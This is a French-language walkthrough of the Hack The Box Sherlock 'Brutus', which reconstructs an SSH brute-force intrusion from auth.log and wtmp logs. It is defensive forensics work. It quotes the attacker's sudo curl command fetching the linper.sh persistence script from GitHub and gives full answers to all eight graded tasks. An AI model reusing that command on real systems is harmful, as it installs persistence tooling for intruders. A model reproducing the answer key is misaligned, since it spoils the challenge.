# HTB Sherlock — Brutus

**Plateforme :** Hack The Box  
**Catégorie :** Sherlock  
**Difficulté :** Very Easy  
**Auteur du challenge :** CyberJunkie  
**Date de publication :** 4 avril 2024  
**Statut :** Résolu — 8/8 tâches validées  
**Outils principaux :** Linux, `auth.log`, `wtmp`, `last`, `MITRE ATT&CK`

---

## 1. Présentation du challenge

Le Sherlock **Brutus** propose une investigation numérique sur un serveur Confluence compromis à la suite d'une attaque par force brute contre son service SSH.

Après avoir obtenu un accès au serveur, l'attaquant réalise plusieurs opérations :

- Connexion à un compte privilégié.
- Ouverture d'une session terminal interactive.
- Création d'un nouvel utilisateur pour maintenir son accès.
- Attribution de privilèges élevés à ce compte.
- Utilisation de `sudo` pour télécharger un script.

L'objectif est d'analyser les journaux Linux afin de reconstituer la chronologie de l'attaque et d'identifier les actions réalisées par l'intrus.

## 2. Objectifs de l'investigation

Les principaux objectifs sont :

1. Identifier l'adresse IP utilisée pour l'attaque par force brute.
2. Identifier le compte compromis.
3. Déterminer l'heure UTC de la connexion interactive.
4. Identifier le numéro de session SSH.
5. Identifier le compte créé pour assurer la persistance.
6. Associer la création du compte à une sous-technique MITRE ATT&CK.
7. Déterminer l'heure de fin de la première session SSH de l'attaquant.
8. Retrouver la commande utilisée pour télécharger un script avec `sudo`.

## 3. Compréhension des artefacts

Deux artefacts Linux sont particulièrement importants dans cette investigation.

### 3.1. auth.log

Le fichier `auth.log` contient les événements liés à l'authentification et à la gestion des privilèges.

Il permet notamment d'identifier :

- Les tentatives de connexion SSH.
- Les authentifications réussies ou échouées.
- Les ouvertures et fermetures de sessions.
- Les créations et modifications de comptes.
- Les changements de mots de passe.
- Les commandes exécutées avec `sudo`.

### 3.2. wtmp

Le fichier `wtmp` conserve l'historique des connexions et des sessions utilisateur.

Il permet notamment de retrouver :

- Les utilisateurs connectés.
- Les terminaux associés aux sessions.
- Les heures de connexion et de déconnexion.
- Les adresses IP d'origine.
- La durée des sessions.

Une distinction importante doit être faite : l'heure d'authentification SSH dans `auth.log` n'est pas nécessairement identique à l'heure d'ouverture effective du terminal dans `wtmp`.

## 4. Investigation technique

### Task 1 — Identifier l'adresse IP de l'attaquant

**Question :** What is the IP address used by the attacker to carry out a brute force attack?

La première étape consiste à examiner les événements SSH dans `auth.log`.

On peut rechercher les tentatives d'authentification SSH avec :

```bash
grep 'sshd' auth.log
```

Pour isoler les authentifications réussies :

```bash
grep 'Accepted password' auth.log
```

L'analyse des événements révèle plusieurs connexions provenant de la même adresse IP.

**Réponse :**

```text
65.2.161.68
```

### Task 2 — Identifier le compte compromis

**Question :** What is the username of the account?

Il faut examiner les événements d'authentification réussie.

Commande :

```bash
grep 'Accepted password' auth.log
```

L'analyse montre que l'attaquant a réussi à s'authentifier en utilisant le compte `root`.

Ce compte dispose de privilèges administrateur sur le système.

**Réponse :**

```text
root
```

### Task 3 — Retrouver l'heure UTC de la connexion interactive

**Question :** Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session.

Cette question nécessite l'analyse du fichier `wtmp`.

La commande utilisée est :

```bash
last -f wtmp -Fai root
```

Explication des options :

- `-f wtmp` : indique le fichier contenant l'historique des connexions.
- `-F` : affiche les dates et heures complètes.
- `-a` : affiche l'adresse IP à la fin de la ligne.
- `-i` : affiche les adresses IP sous forme numérique.
- `root` : filtre les sessions du compte root.

Résultat pertinent :

```text
root pts/1 Wed Mar  6 07:32:45 2024 - Wed Mar  6 07:37:24 2024 (00:04) 65.2.161.68
```

Le résultat indique que la session interactive de l'attaquant a commencé le 6 mars 2024 à 07:32:45, selon l'heure locale affichée par le système.

Après conversion de UTC+1 vers UTC :

```text
2024-03-06 06:32:45
```

**Réponse :**

```text
2024-03-06 06:32:45
```

**Point important :** il ne faut pas confondre l'heure de l'authentification SSH avec celle de l'ouverture effective de la session terminal. C'est précisément pour cette raison que le challenge demande de consulter `wtmp`.

### Task 4 — Identifier le numéro de session SSH

**Question :** What is the session number assigned to the attacker's session?

L'identification du numéro de session repose sur les événements de `systemd-logind` dans `auth.log`.

On recherche les événements associés à la création d'une session :

```bash
grep 'New session' auth.log
```

L'événement pertinent indique :

```text
New session 37 of user root.
```

Le numéro attribué à la session de l'attaquant est donc :

**Réponse :**

```text
37
```

### Task 5 — Identifier le compte créé pour assurer la persistance

**Question :** What is the name of this account?

Après avoir obtenu un accès au serveur, l'attaquant crée un nouvel utilisateur.

On peut rechercher les événements de création de comptes :

```bash
grep -E 'groupadd|useradd' auth.log
```

Les événements révèlent la création d'un utilisateur nommé `cyberjunkie`.

L'attaquant modifie ensuite les privilèges de ce compte afin de lui permettre d'utiliser les commandes administrateur.

**Réponse :**

```text
cyberjunkie
```

### Task 6 — Identifier la sous-technique MITRE ATT&CK

**Question :** What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

L'attaquant crée un nouveau compte local pour conserver un accès au système.

Cette action correspond à la sous-technique suivante :

**MITRE ATT&CK — T1136.001 : Create Account: Local Account**

La technique parente est :

```text
T1136 — Create Account
```

La sous-technique `.001` désigne spécifiquement la création d'un compte local.

**Réponse :**

```text
T1136.001
```

### Task 7 — Déterminer l'heure de fin de la première session SSH

**Question :** What time did the attacker's first SSH session end according to auth.log?

Il faut retrouver dans `auth.log` les événements de fermeture de la session SSH initiale.

On peut rechercher les déconnexions :

```bash
grep -E 'Disconnected from user root|session closed for user root' auth.log
```

Les événements pertinents indiquent que la session de l'attaquant est terminée le 6 mars 2024 à 06:37:24, selon l'horodatage retenu dans le journal.

**Réponse :**

```text
2024-03-06 06:37:24
```

### Task 8 — Retrouver la commande utilisée pour télécharger le script

**Question :** What is the full command executed using sudo?

L'attaquant se connecte ensuite avec son compte de persistance `cyberjunkie`.

Il utilise `sudo` pour exécuter `curl` et télécharger un script hébergé sur GitHub.

On peut rechercher les commandes exécutées avec `sudo` :

```bash
grep 'sudo:' auth.log
```

L'événement pertinent indique :

```text
sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

La commande complète est :

```bash
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

**Réponse :**

```text
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

## 5. Synthèse des réponses

| Tâche | Élément recherché | Réponse |
|---|---|---|
| 1 | Adresse IP de l'attaquant | `65.2.161.68` |
| 2 | Compte compromis | `root` |
| 3 | Connexion interactive en UTC | `2024-03-06 06:32:45` |
| 4 | Numéro de session | `37` |
| 5 | Compte créé pour la persistance | `cyberjunkie` |
| 6 | Sous-technique MITRE ATT&CK | `T1136.001` |
| 7 | Fin de la première session SSH | `2024-03-06 06:37:24` |
| 8 | Commande de téléchargement | `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` |

## 6. Chronologie reconstituée de l'attaque

L'analyse des journaux permet de reconstituer les grandes étapes de l'incident.

1. **Reconnaissance et force brute :** l'attaquant utilise l'adresse IP `65.2.161.68` pour tenter d'accéder au serveur via SSH.
2. **Compromission :** les tentatives aboutissent à un accès au compte `root`.
3. **Ouverture d'une session interactive :** le 6 mars 2024 à 06:32:45 UTC, une session terminal est établie.
4. **Identification de la session :** le système attribue le numéro `37` à la session root.
5. **Persistance :** l'attaquant crée le compte `cyberjunkie`.
6. **Élévation des privilèges :** le compte est ajouté au groupe `sudo`.
7. **Fin de la première session :** la session root se termine à 06:37:24 UTC.
8. **Activité avec le compte de persistance :** l'attaquant utilise `sudo` pour télécharger `linper.sh` depuis GitHub.

## 7. MITRE ATT&CK — Correspondance

| Comportement observé | Technique ou sous-technique |
|---|---|
| Attaque par force brute | T1110 — Brute Force |
| Connexion à distance par SSH | T1021.004 — SSH |
| Création d'un compte local | T1136.001 — Create Account: Local Account |
| Utilisation de privilèges élevés | T1548.003 — Sudo and Sudo Caching |

Ces correspondances décrivent les comportements observés et leur rapprochement avec le référentiel MITRE ATT&CK.

## 8. Leçons techniques

Ce Sherlock permet de retenir plusieurs points importants en investigation numérique Linux :

- `auth.log` est une source essentielle pour analyser les authentifications et les événements liés aux privilèges.
- `wtmp` permet de reconstituer les sessions interactives et leurs horaires.
- Les heures d'authentification et d'ouverture de session peuvent être différentes.
- La création d'un utilisateur supplémentaire peut constituer une technique de persistance.
- L'ajout d'un utilisateur au groupe `sudo` lui confère des privilèges élevés.
- Les commandes exécutées avec `sudo` peuvent laisser des traces utiles dans les journaux système.
- La corrélation de plusieurs artefacts permet de reconstituer une chronologie plus fiable qu'en analysant un seul fichier.

## 9. Conclusion

Le Sherlock **Brutus** démontre l'importance de l'analyse des journaux Linux dans une investigation de cybersécurité.

À partir de deux artefacts principaux, `auth.log` et `wtmp`, il a été possible d'identifier l'adresse IP de l'attaquant, le compte compromis, les horaires des sessions, le mécanisme de persistance et la commande utilisée pour télécharger un script.

Cette investigation illustre une démarche fondamentale en Blue Team et en réponse à incident : collecter les traces, identifier les événements pertinents, les corréler et reconstruire une chronologie cohérente de l'activité malveillante.

**Résultat final : 8 tâches sur 8 validées.**

**Sherlock : BRUTUS — SOLVED.**